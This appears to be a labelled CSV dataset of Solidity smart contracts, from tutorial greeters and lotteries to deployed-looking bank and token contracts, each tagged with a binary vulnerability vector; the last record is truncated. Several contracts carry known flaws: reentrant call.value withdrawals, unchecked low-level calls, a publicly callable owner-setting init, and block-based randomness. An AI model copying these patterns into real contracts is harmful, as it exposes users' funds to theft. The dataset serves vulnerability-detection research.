_id,name,code,label
10001,01_say_hello,"pragma solidity ^0.4.22;



contract Greeter {

    string greeting;

    address owner;



    modifier onlyOwner {

        require(isOwner(), ""Only owner can do that!"");

        _;

    }

    

    constructor(string _greeting) public {

        greeting = _greeting;

        owner = msg.sender;

    }



    function sayHello() public view returns(string) {

        if (isOwner()) {

            return ""Hey daddy!"";

        } else {

            return greeting;

        }

    }



    function setGreeting(string _newGreeting) public onlyOwner {

        greeting = _newGreeting;

    }

    

    function isOwner() view private returns(bool) {

        return msg.sender == owner;    

    }

}

",0000000000000000000000100
10002,02_balance_address_checker,"pragma solidity ^0.4.22;



contract Checker {

    address owner;

    

    constructor() public {

        owner = msg.sender;    

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    function getBalanceOfContract() public view returns(uint) {

        return address(this).balance;

    }

    

    function getBalanceOfOwner() public view onlyOwner returns(uint){

        return owner.balance;

    }

    

    function getBalanceOfSender() public view returns(uint) {

        return msg.sender.balance;

    }

    

    function getAddressOfContract() public view returns(address) {

        return this;

    }

   

    function getAddressOfOwner() public view returns(address) {

        return owner;    

    }

     

    function getAddressOfSender() public view returns(address) {

        return msg.sender;

    }

}",0000000000000000000000000
10003,03_basic_random,"pragma solidity ^0.4.23;



contract BasicRandom {

    uint randNonce = 0;



    function getRandomNumber() public returns(uint) {

        uint rand = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce)));

        randNonce++;        

        return rand;

    }

}",0000000000000000000000000
10004,04_lottery_10_users,"pragma solidity ^0.4.23;



contract Lottery10Users {

    address[10] participants;

    uint8 participantsCount = 0;

    uint randNonce = 0;



    function join() public payable {

        require(msg.value == 0.1 ether, ""Must send 0.1 ether"");

        require(participantsCount < 10, ""User limit reached"");

        require(joinedAlready(msg.sender) == false, ""User already joined"");

        participants[participantsCount] = msg.sender;

        participantsCount++;

        if (participantsCount == 10) {

            selectWinner();

        }

    }

    

    function joinedAlready(address _participant) private view returns(bool) {

        bool containsParticipant = false;

        for(uint i = 0; i < 10; i++) {

            if (participants[i] == _participant) {

                containsParticipant = true;

            }

        }

        return containsParticipant;

    }

    

    function selectWinner() private returns(address) {

        require(participantsCount == 10, ""Waiting for more users"");

        address winner = participants[randomNumber()];

        winner.transfer(address(this).balance);

        delete participants;

        participantsCount = 0;

        return winner;

    }

    

    function randomNumber() private returns(uint) {

        uint rand = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % 10;

        randNonce++;

        return rand;

    }

        

}",0000000000000000000000000
10005,04_lottery_10_users_adamskrodzki,"pragma solidity ^0.4.24;





 

contract LotteryFor10{



    address[] users; 

    mapping(address => bool) participated;

    uint256 public constant WAIT_BLOCKS_LIMIT = 3 ;

    uint256 public registeredCount ;

    uint256 public _registeredLimit ;

    uint256 constant REGISTERING_PARTICIPANTS = 1;

    uint256 constant REGISTERING_FINISHED = 2;

    uint256 constant WAITING_FOR_RANDOMNESS = 3;

    uint256 constant SOLVING_LOTERRY = 4;

    uint256 constant LOTTERY_SOLVED = 5;

    uint256 public waitingStartBlockNumber;

    bool public lotterySolved;

    

    constructor(uint256 _limit) public{

        waitingStartBlockNumber = 0;

        registeredCount = 0; 
        _registeredLimit = _limit;

    }

    

    

    

    function () public payable{

        

        if(getStage(block.number)==REGISTERING_PARTICIPANTS){

            processAddingUser(msg.sender);

        }

        else{  
            if(getStage(block.number)==REGISTERING_FINISHED){

                require(msg.value == 0,""no additional stake allowed"");

                waitingStartBlockNumber = block.number;

                emit ClosingList(waitingStartBlockNumber);

            }

            else{

                if(getStage(block.number)==WAITING_FOR_RANDOMNESS){

                        require(msg.value == 0,""no additional stake allowed"");

                        

                        revert(""To little time passed, wait at least WAIT_BLOCKS_LIMIT "");

                }

                else{

                    if(getStage(block.number)==SOLVING_LOTERRY){

                        require(msg.value == 0,""no additional stake allowed"");

                        processSolvingLottery(block.number);

                    }

                    else{        

                        revert(""Lottery Closed "");

                    }

                }

            }

        }

    }

    

    

    function getStage(uint256 blockNum) private view returns(uint256) {

        if(registeredCount<_registeredLimit){

            return REGISTERING_PARTICIPANTS;

        }

        else{

            if(waitingStartBlockNumber==0  
                || blockNum-waitingStartBlockNumber>=256  
                ){

                return REGISTERING_FINISHED;

            }

            else

            {

                if(blockNum-waitingStartBlockNumber<WAIT_BLOCKS_LIMIT){

                    return WAITING_FOR_RANDOMNESS;

                }

                else{

                    if(lotterySolved == true){

                        return LOTTERY_SOLVED;

                    }

                    else{

                        return SOLVING_LOTERRY;

                    }

                }

            }

        }

    }

    

    function processAddingUser(address sender) private{

        require(msg.value==1 finney,""Must send 0.001 ether"");

        require(participated[sender]==false,""One address can pericipate only once"");

        require(registeredCount<_registeredLimit,""ups getStage() do not work"");

        participated[sender] = true;

        users.push(sender);

        registeredCount = registeredCount+1;

        emit UserRegistered(sender);

    }

    

    function processSolvingLottery(uint256 blockNum) private{

        uint256 luckyNumber = uint256(blockhash(waitingStartBlockNumber+WAIT_BLOCKS_LIMIT));

        luckyNumber = luckyNumber % _registeredLimit;

        users[luckyNumber].transfer(address(this).balance);

        emit UseRewarded(users[luckyNumber],blockNum);

        lotterySolved = true;

    }

    

    event ClosingList(uint256 blockNum);

    event UserRegistered(address adr);

    event UseRewarded(address adr,uint256 blockNum);

}

",0000000000000000001000000
10006,05_lottery_no_limit,"pragma solidity ^0.4.23;



contract LotteryNoLimit {

    address owner;

    address[] users;

    uint randNonce = 0;

    

    modifier isOwner() {

        require(msg.sender == owner, ""only owner can do that"");

        _;

    }

    

    constructor() public {

        owner = msg.sender;    

    }

    

    function join() payable public {

        require(msg.value == 0.1 ether, ""Send 0.1 Ether"");

        users.push(msg.sender);

    }

    

    function selectWinner() public isOwner {

        require(users.length > 0, ""No users in the lottery"");

        users[randomNumber(users.length)].transfer(address(this).balance);  

        delete users;

    }

    

    function randomNumber(uint _limit) private returns(uint) {

        uint rand = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % _limit;

        randNonce++;

        return rand;

    }

}",0000000000000000000000000
10007,06_lottery_multiple_winners,"pragma solidity ^0.4.23;



contract LotteryMultipleWinners {

    address owner;

    uint randNonce = 0;

    address[] winners;

    uint prize;



    enum LotteryState { Accepting, Finished }

    LotteryState state; 



    mapping (address => bool) gotReward;

    mapping (uint => address[]) choices;

    

    modifier isOwner {

        require(msg.sender == owner, ""Must be owner"");

        _;

    }

    

    constructor() public {

        owner = msg.sender;   

        state = LotteryState.Accepting; 

    }

    

    function join(uint8 _chosenNumber) payable public {

        require(_chosenNumber > 0 && _chosenNumber <= 100, ""Number must be in 1-100"");

        require(msg.value == 0.1 ether, ""Transfer 0.1 Eth to join"");

        require(state == LotteryState.Accepting, ""Lottery is closed"");

        choices[_chosenNumber].push(msg.sender);   

    }

    

    function selectWinners() public isOwner returns(uint) {

        state = LotteryState.Finished;

        uint chosen = randomNumber(100) + 1;

        winners = choices[chosen];

        prize = address(this).balance / winners.length;

    }



    function withdrawReward() public {

        require(isWinner(), ""You must be a winner"");

        require(gotReward[msg.sender] != true, ""You have got your reward"");

        gotReward[msg.sender] = true;

        msg.sender.transfer(prize);

    }

    

    function isWinner() public view returns(bool) {

        for(uint i = 0; i < winners.length; i++) {

            if (winners[i] == msg.sender) {

                return true;

            } else {

                return false;

            }

        }

    }



    function randomNumber(uint _limit) internal returns(uint) {

        uint rand = uint(keccak256(abi.encodePacked(now, msg.sender, randNonce))) % _limit;

        randNonce++;

        return rand;

    } 

    

}",0100000000000000000001000
10008,07_fundraising,"pragma solidity ^0.4.22;



contract FundRaising {

    address owner;

    uint public goal;

    uint public endTime;

    uint public total = 0;

    

    mapping(address=>uint) donations;

    

    constructor(uint _goal, uint _timeLimit) public {

        owner = msg.sender;

        goal = _goal;

        endTime = now + _timeLimit;

    }

    

    function add() payable public {

        require(now < endTime, ""Fundraising is closed."");

        require(total < goal, ""We reached a goal."");

        require(msg.value > 0, ""You need to send some ether"");

        donations[msg.sender] += msg.value; 

        total += msg.value;

    }

    

    function withdrawOwner() public {

        require(msg.sender == owner, ""You must be owner"");

        require(total >= goal, ""Fundraising not closed yet"");

        owner.transfer(address(this).balance);

    }

    

    function withdraw() public {

        require(now > endTime, ""Fundraising not closed"");

        require(total < goal, ""Can not withdraw when fundraising was successful"");

        uint amount = donations[msg.sender];

        total -= amount;

        donations[msg.sender] = 0;

        address(msg.sender).transfer(amount);

    }

}",0000000000000000000000000
10009,08_basic_token,"pragma solidity ^0.4.22;



contract BasicToken {

    uint public initialSupply;



    mapping(address=>uint) balances;

    

    constructor(uint _initialSupply) public {

        initialSupply = _initialSupply;

        balances[msg.sender] = _initialSupply;

    }

    

    function transfer(address _recipient, uint _amount) public {

        require(balances[msg.sender] >= _amount, ""Not enough funds"");

        require(_recipient != msg.sender, ""No need to send tokens to yourself"");

        require(balances[_recipient] + _amount > balances[_recipient]);  
        balances[msg.sender] -= _amount;

        balances[_recipient] += _amount;

    }



    function balanceOf(address _owner) public view returns (uint) {

        return balances[_owner];

    }

}",0000000000000000000000000
10010,09_erc_20_token,"pragma solidity ^0.4.22;



contract TokenErc20 {

    string public name;

    string public symbol;

    uint8 decimals;

    

    uint public totalSupply;



    event Transfer(address indexed _from, address indexed _to, uint value);

    event Approval(address indexed _owner, address indexed _spender, uint value);

    

    mapping(address=>uint) public balances;

    mapping(address => mapping(address => uint)) allowances;

    

    constructor(

        string _name, 

        string _symbol,

        uint8 _decimals,

        uint _initialSupply

        ) public {

        name = _name;

        symbol = _symbol;

        decimals = _decimals;

        balances[msg.sender] = _initialSupply;

    }

    

    function balanceOf(address _owner) public view returns(uint balance) {

        return balances[_owner];    

    }

    

    function transfer(address _to, uint _value) public returns(bool success) {

        transferFrom(msg.sender, _to, _value);

    }

    

    function transferFrom(address _from, address _to, uint _value) public {

        require(balances[_from] >= _value);

        require(allowance(_from, _to) >= _value);

        balances[_from] -= _value;

        balances[_to] += _value;

        emit Transfer(_from, _to, _value);

    }

    

    function approve(address _spender, uint _value) public {

        allowances[msg.sender][_spender] = _value;   

    }

    

    function allowance(address _owner, address _spender) public view returns(uint) {

        allowances[_owner][_spender];    

    }

}",0000000001000000000000000
10011,0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f,"

pragma solidity ^0.4.19;



contract PERSONAL_BANK

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum = 1 ether;

    

    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)revert();

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)revert();

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}







contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000100000000001000000
10012,0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e,"

pragma solidity ^0.4.21;



contract PoCGame

{

    

     

     

    modifier onlyOwner()

    {

        require(msg.sender == owner);

        _;

    }

    

   modifier isOpenToPublic()

    {

        require(openToPublic);

        _;

    }



    modifier onlyRealPeople()

    {

          require (msg.sender == tx.origin);

        _;

    }



    modifier  onlyPlayers()

    { 

        require (wagers[msg.sender] > 0); 

        _; 

    }

    

   

     

    event Wager(uint256 amount, address depositer);

    event Win(uint256 amount, address paidTo);

    event Lose(uint256 amount, address loser);

    event Donate(uint256 amount, address paidTo, address donator);

    event DifficultyChanged(uint256 currentDifficulty);

    event BetLimitChanged(uint256 currentBetLimit);



     

    address private whale;

    uint256 betLimit;

    uint difficulty;

    uint private randomSeed;

    address owner;

    mapping(address => uint256) timestamps;

    mapping(address => uint256) wagers;

    bool openToPublic;

    uint256 totalDonated;



     

    constructor(address whaleAddress, uint256 wagerLimit) 

    onlyRealPeople()

    public 

    {

        openToPublic = false;

        owner = msg.sender;

        whale = whaleAddress;

        totalDonated = 0;

        betLimit = wagerLimit;

        

    }





     

    function OpenToThePublic() 

    onlyOwner()

    public

    {

        openToPublic = true;

    }

    

     

    function AdjustBetAmounts(uint256 amount) 

    onlyOwner()

    public

    {

        betLimit = amount;

        

        emit BetLimitChanged(betLimit);

    }

    

      

    function AdjustDifficulty(uint256 amount) 

    onlyOwner()

    public

    {

        difficulty = amount;

        

        emit DifficultyChanged(difficulty);

    }

    

    

    function() public payable { }



     

    function wager()

    isOpenToPublic()

    onlyRealPeople() 

    payable

    public 

    {

         
        require(msg.value == betLimit);

        

         
        require(wagers[msg.sender] == 0);



         
        timestamps[msg.sender] = block.number;

        wagers[msg.sender] = msg.value;

        emit Wager(msg.value, msg.sender);

    }

    

     

    function play()

    isOpenToPublic()

    onlyRealPeople()

    onlyPlayers()

    public

    {

        uint256 blockNumber = timestamps[msg.sender];

        if(blockNumber < block.number)

        {

            timestamps[msg.sender] = 0;

            wagers[msg.sender] = 0;

    

            uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1;

    

            if(winningNumber == difficulty / 2)

            {

                payout(msg.sender);

            }

            else 

            {

                 
                loseWager(betLimit / 2);

            }    

        }

        else

        {

            revert();

        }

    }



     

    function donate()

    isOpenToPublic()

    public 

    payable

    {

        donateToWhale(msg.value);

    }



     

    function payout(address winner) 

    internal 

    {

        uint256 ethToTransfer = address(this).balance / 2;

        

        winner.transfer(ethToTransfer);

        emit Win(ethToTransfer, winner);

    }



     

    function donateToWhale(uint256 amount) 

    internal 

    {

         
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));

        totalDonated += amount;

        emit Donate(amount, whale, msg.sender);

    }



     

    function loseWager(uint256 amount) 

    internal 

    {

         
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));

        totalDonated += amount;

        emit Lose(amount, msg.sender);

    }

    



     

    function ethBalance() 

    public 

    view 

    returns (uint256)

    {

        return address(this).balance;

    }

    

    

     

    function currentDifficulty() 

    public 

    view 

    returns (uint256)

    {

        return difficulty;

    }

    

    

     

    function currentBetLimit() 

    public 

    view 

    returns (uint256)

    {

        return betLimit;

    }

    

    function hasPlayerWagered(address player)

    public 

    view 

    returns (bool)

    {

        if(wagers[player] > 0)

        {

            return true;

        }

        else

        {

            return false;

        }

        

    }



     

    function winnersPot() 

    public 

    view 

    returns (uint256)

    {

        return address(this).balance / 2;

    }



     

    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) 

    public 

    onlyOwner() 

    returns (bool success) 

    {

        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);

    }

}



 
contract ERC20Interface 

{

    function transfer(address to, uint256 tokens) public returns (bool success);

}",0000000000000000001000000
10013,0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9,"

pragma solidity ^0.4.10;



contract Caller {

    function callAddress(address a) {

         
        a.call();

    }

}",0001000000000000000000000
10014,0x19cf8481ea15427a98ba3cdd6d9e14690011ab10,"

pragma solidity ^0.4.11;

interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }





 
contract MigrationAgent {

    function migrateFrom(address _from, uint256 _value);

}



contract ERC20 {

  uint public totalSupply;

  function balanceOf(address who) constant returns (uint);

  function allowance(address owner, address spender) constant returns (uint);



  function transfer(address to, uint value) returns (bool ok);

  function transferFrom(address from, address to, uint value) returns (bool ok);

  function approve(address spender, uint value) returns (bool ok);

  event Transfer(address indexed from, address indexed to, uint value);

  event Approval(address indexed owner, address indexed spender, uint value);

}







 

contract SafeMath {

  function safeMul(uint a, uint b) internal returns (uint) {

    uint c = a * b;

    assert(a == 0 || c / a == b);

    return c;

  }



  function safeDiv(uint a, uint b) internal returns (uint) {

    assert(b > 0);

    uint c = a / b;

    assert(a == b * c + a % b);

    return c;

  }



  function safeSub(uint a, uint b) internal returns (uint) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint a, uint b) internal returns (uint) {

    uint c = a + b;

    assert(c>=a && c>=b);

    return c;

  }



  function max64(uint64 a, uint64 b) internal constant returns (uint64) {

    return a >= b ? a : b;

  }



  function min64(uint64 a, uint64 b) internal constant returns (uint64) {

    return a < b ? a : b;

  }



  function max256(uint256 a, uint256 b) internal constant returns (uint256) {

    return a >= b ? a : b;

  }



  function min256(uint256 a, uint256 b) internal constant returns (uint256) {

    return a < b ? a : b;

  }



  function assert(bool assertion) internal {

    if (!assertion) {

      throw;

    }

  }

}







 

contract StandardToken is ERC20, SafeMath {



   

  event Minted(address receiver, uint amount);



   

  mapping(address => uint) balances;

   
  mapping(address => uint) balancesRAW;

   

  mapping (address => mapping (address => uint)) allowed;



   

  function isToken() public constant returns (bool weAre) {

    return true;

  }



  function transfer(address _to, uint _value) returns (bool success) {

    balances[msg.sender] = safeSub(balances[msg.sender], _value);

    balances[_to] = safeAdd(balances[_to], _value);

    Transfer(msg.sender, _to, _value);

    return true;

  }



  function transferFrom(address _from, address _to, uint _value) returns (bool success) {

    uint _allowance = allowed[_from][msg.sender];



    balances[_to] = safeAdd(balances[_to], _value);

    balances[_from] = safeSub(balances[_from], _value);

    allowed[_from][msg.sender] = safeSub(_allowance, _value);

    Transfer(_from, _to, _value);

    return true;

  }



  function balanceOf(address _owner) constant returns (uint balance) {

    return balances[_owner];

  }



  function approve(address _spender, uint _value) returns (bool success) {



     
     
     
     
    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;



    allowed[msg.sender][_spender] = _value;

    Approval(msg.sender, _spender, _value);

    return true;

  }



  function allowance(address _owner, address _spender) constant returns (uint remaining) {

    return allowed[_owner][_spender];

  }



  

  

}





 
contract daoPOLSKAtokens{



    string public name = ""DAO POLSKA TOKEN version 1"";

    string public symbol = ""DPL"";

    uint8 public constant decimals = 18;   


     
    address public owner;

    address public migrationMaster;	

     


    uint256 public otherchainstotalsupply =1.0 ether;

    uint256 public supplylimit      = 10000.0 ether;

	 
   uint256 public  totalSupply      = 0.0 ether;

	 
	address public Chain1 = 0x0;

	address public Chain2 = 0x0;

	address public Chain3 = 0x0;

	address public Chain4 = 0x0;



	address public migrationAgent=0x8585D5A25b1FA2A0E6c3BcfC098195bac9789BE2;

    uint256 public totalMigrated;





    event Migrate(address indexed _from, address indexed _to, uint256 _value);

    event Refund(address indexed _from, uint256 _value);



	

	struct sendTokenAway{

		StandardToken coinContract;

		uint amount;

		address recipient;

	}

	mapping(uint => sendTokenAway) transfers;

	uint numTransfers=0;

	

  mapping (address => uint256) balances;

mapping (address => uint256) balancesRAW;

  mapping (address => mapping (address => uint256)) allowed;



	event UpdatedTokenInformation(string newName, string newSymbol);	

 

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

	event receivedEther(address indexed _from,uint256 _value);

  event Approval(address indexed _owner, address indexed _spender, uint256 _value);



       
    event Burn(address indexed from, uint256 value);

   
  bool public supplylimitset = false;

  bool public otherchainstotalset = false;

   

  function daoPOLSKAtokens() {

owner=msg.sender;

migrationMaster=msg.sender;

}



function  setSupply(uint256 supplyLOCKER) public {

    	   if (msg.sender != owner) {

      throw;

    }

		    	   if (supplylimitset != false) {

      throw;

    }

	supplylimitset = true;

  

	supplylimit = supplyLOCKER ** uint256(decimals);

 
  } 

function setotherchainstotalsupply(uint256 supplyLOCKER) public {

    	   if (msg.sender != owner) {

      throw;

    }

	    	   if (supplylimitset != false) {

      throw;

    }



	otherchainstotalset = true;

	otherchainstotalsupply = supplyLOCKER ** uint256(decimals);

	

  } 

     

    function approveAndCall(address _spender, uint256 _value, bytes _extraData)

        public

        returns (bool success) {

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, this, _extraData);

            return true;

        }

    }



     

    function burn(uint256 _value) public returns (bool success) {

        require(balances[msg.sender] >= _value);    
        balances[msg.sender] -= _value;             
        totalSupply -= _value;                       
        Burn(msg.sender, _value);

        return true;

    }



     

    function burnFrom(address _from, uint256 _value) public returns (bool success) {

        require(balances[_from] >= _value);                 
        require(_value <= allowed[_from][msg.sender]);     
        balances[_from] -= _value;                          
        allowed[_from][msg.sender] -= _value;              
        totalSupply -= _value;                               
        Burn(_from, _value);

        return true;

    }

  

  function transfer(address _to, uint256 _value) returns (bool success) {

     
     
     
    if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {

     
      balances[msg.sender] -= _value;

      balances[_to] += _value;

      Transfer(msg.sender, _to, _value);

      return true;

    } else { return false; }

  }



  function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {

     
    if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {

     
      balances[_to] += _value;

      balances[_from] -= _value;

      allowed[_from][msg.sender] -= _value;

      Transfer(_from, _to, _value);

      return true;

    } else { return false; }

  }



  function balanceOf(address _owner) constant returns (uint256 balance) {

    return balances[_owner];

  }



  function approve(address _spender, uint256 _value) returns (bool success) {

    allowed[msg.sender][_spender] = _value;

    Approval(msg.sender, _spender, _value);

    return true;

  }



  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {

    return allowed[_owner][_spender];

  }





	

	    function () payable  public {

		 if(funding){ 

        receivedEther(msg.sender, msg.value);

		balances[msg.sender]=balances[msg.sender]+msg.value;

		} else throw;

		

    }

   







	

  function setTokenInformation(string _name, string _symbol) {

    

	   if (msg.sender != owner) {

      throw;

    }

	name = _name;

    symbol = _symbol;



    UpdatedTokenInformation(name, symbol);

  }



function setChainsAddresses(address chainAd, int chainnumber) {

    

	   if (msg.sender != owner) {

      throw;

    }

	if(chainnumber==1){Chain1=chainAd;}

	if(chainnumber==2){Chain2=chainAd;}

	if(chainnumber==3){Chain3=chainAd;}

	if(chainnumber==4){Chain4=chainAd;}		

  } 



  function DAOPolskaTokenICOregulations() external returns(string wow) {

	return 'Regulations of preICO and ICO are present at website  DAO Polska Token.network and by using this smartcontract and blockchains you commit that you accept and will follow those rules';

}

 




	function sendTokenAw(address StandardTokenAddress, address receiver, uint amount){

		if (msg.sender != owner) {

		throw;

		}

		sendTokenAway t = transfers[numTransfers];

		t.coinContract = StandardToken(StandardTokenAddress);

		t.amount = amount;

		t.recipient = receiver;

		t.coinContract.transfer(receiver, amount);

		numTransfers++;

	}



      
uint public tokenCreationRate=1000;

uint public bonusCreationRate=1000;

uint public CreationRate=1761;

   uint256 public constant oneweek = 36000;

uint256 public fundingEndBlock = 5433616;

bool public funding = true;

bool public refundstate = false;

bool public migratestate= false;

        function createDaoPOLSKAtokens(address holder) payable {



        if (!funding) throw;



         
        if (msg.value == 0) throw;

		 
        if (msg.value > (supplylimit - totalSupply) / CreationRate)

          throw;

		

		 
 
 






	 var numTokensRAW = msg.value;



        var numTokens = msg.value * CreationRate;

        totalSupply += numTokens;



         
        balances[holder] += numTokens;

        balancesRAW[holder] += numTokensRAW;

         
        Transfer(0, holder, numTokens);

		

		 
        uint256 percentOfTotal = 12;

        uint256 additionalTokens = 	numTokens * percentOfTotal / (100);



        totalSupply += additionalTokens;



        balances[migrationMaster] += additionalTokens;

        Transfer(0, migrationMaster, additionalTokens);

	

	}

	function setBonusCreationRate(uint newRate){

	if(msg.sender == owner) {

	bonusCreationRate=newRate;

	CreationRate=tokenCreationRate+bonusCreationRate;

	}

	}



    function FundsTransfer() external {

	if(funding==true) throw;

		 	if (!owner.send(this.balance)) throw;

    }

	

    function PartialFundsTransfer(uint SubX) external {

	      if (msg.sender != owner) throw;

         
        owner.send(this.balance - SubX);

	}

	function turnrefund() external {

	      if (msg.sender != owner) throw;

	refundstate=!refundstate;

        }

		

			function fundingState() external {

	      if (msg.sender != owner) throw;

	funding=!funding;

        }

    function turnmigrate() external {

	      if (msg.sender != migrationMaster) throw;

	migratestate=!migratestate;

}



     
	

function finalize() external {

        if (block.number <= fundingEndBlock+8*oneweek) throw;

         
        funding = false;	

		refundstate=!refundstate;

         
        if (msg.sender==owner)

         
		owner.send(this.balance);

    }

    function migrate(uint256 _value) external {

         
        if (migratestate) throw;





         
        if (_value == 0) throw;

        if (_value > balances[msg.sender]) throw;



        balances[msg.sender] -= _value;

        totalSupply -= _value;

        totalMigrated += _value;

        MigrationAgent(migrationAgent).migrateFrom(msg.sender, _value);

        Migrate(msg.sender, migrationAgent, _value);

    }

	

function refundTRA() external {

         
        if (funding) throw;

        if (!refundstate) throw;



        var DAOPLTokenValue = balances[msg.sender];

        var ETHValue = balancesRAW[msg.sender];

        if (ETHValue == 0) throw;

        balancesRAW[msg.sender] = 0;

        totalSupply -= DAOPLTokenValue;

         

        Refund(msg.sender, ETHValue);

        msg.sender.transfer(ETHValue);

}



function preICOregulations() external returns(string wow) {

	return 'Regulations of preICO are present at website  daopolska.pl and by using this smartcontract you commit that you accept and will follow those rules';

}





}





 ",0000000100000000001010100
10015,0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4,"

pragma solidity ^0.4.19;



contract PrivateBank

{

    mapping (address => uint) public balances;

    

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    function PrivateBank(address _log)

    {

        TransferLog = Log(_log);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value >= MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    {

        if(_am<=balances[msg.sender])

        {            

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10016,0x2972d548497286d18e92b5fa1f8f9139e5653fd2," 



pragma solidity ^0.4.0; 

contract demo{

    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

              
            caddress.call(id,from,_tos[i],v[i]);

        }

        return true;

    }

}",0100000000000000000001000
10017,0x39cfd754c85023648bf003bea2dd498c5612abfa,"

pragma solidity ^0.4.18;



contract Ownable

{

    address newOwner;

    address owner = msg.sender;

    

    function changeOwner(address addr)

    public

    onlyOwner

    {

        newOwner = addr;

    }

    

    function confirmOwner() 

    public

    {

        if(msg.sender==newOwner)

        {

            owner=newOwner;

        }

    }

    

    modifier onlyOwner

    {

        if(owner == msg.sender)_;

    }

}



contract Token is Ownable

{

    address owner = msg.sender;

    function WithdrawToken(address token, uint256 amount,address to)

    public 

    onlyOwner

    {

         
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 

    }

}



contract TokenBank is Token

{

    uint public MinDeposit;

    mapping (address => uint) public Holders;

    

      
    function initTokenBank()

    public

    {

        owner = msg.sender;

        MinDeposit = 1 ether;

    }

    

    function()

    payable

    {

        Deposit();

    }

   

    function Deposit() 

    payable

    {

        if(msg.value>MinDeposit)

        {

            Holders[msg.sender]+=msg.value;

        }

    }

    

    function WitdrawTokenToHolder(address _to,address _token,uint _amount)

    public

    onlyOwner

    {

        if(Holders[_to]>0)

        {

            Holders[_to]=0;

            WithdrawToken(_token,_amount,_to);     

        }

    }

   

    function WithdrawToHolder(address _addr, uint _wei) 

    public

    onlyOwner

    payable

    {

        if(Holders[msg.sender]>0)

        {

            if(Holders[_addr]>=_wei)

            {

                 
                _addr.call.value(_wei);

                Holders[_addr]-=_wei;

            }

        }

    }

    

 

}",0000000000010000000010000
10018,0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01,"



pragma solidity ^0.4.18;



contract Ownable

{

    address newOwner;

    address owner = msg.sender;

    

    function changeOwner(address addr)

    public

    onlyOwner

    {

        newOwner = addr;

    }

    

    function confirmOwner() 

    public

    {

        if(msg.sender==newOwner)

        {

            owner=newOwner;

        }

    }

    

    modifier onlyOwner

    {

        if(owner == msg.sender)_;

    }

}



contract Token is Ownable

{

    address owner = msg.sender;

    function WithdrawToken(address token, uint256 amount,address to)

    public 

    onlyOwner

    {

         
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 

    }

}



contract TokenBank is Token

{

    uint public MinDeposit;

    mapping (address => uint) public Holders;

    

      
    function initTokenBank()

    public

    {

        owner = msg.sender;

        MinDeposit = 1 ether;

    }

    

    function()

    payable

    {

        Deposit();

    }

   

    function Deposit() 

    payable

    {

        if(msg.value>MinDeposit)

        {

            Holders[msg.sender]+=msg.value;

        }

    }

    

    function WitdrawTokenToHolder(address _to,address _token,uint _amount)

    public

    onlyOwner

    {

        if(Holders[_to]>0)

        {

            Holders[_to]=0;

            WithdrawToken(_token,_amount,_to);     

        }

    }

   

    function WithdrawToHolder(address _addr, uint _wei) 

    public

    onlyOwner

    payable

    {

        if(Holders[msg.sender]>0)

        {

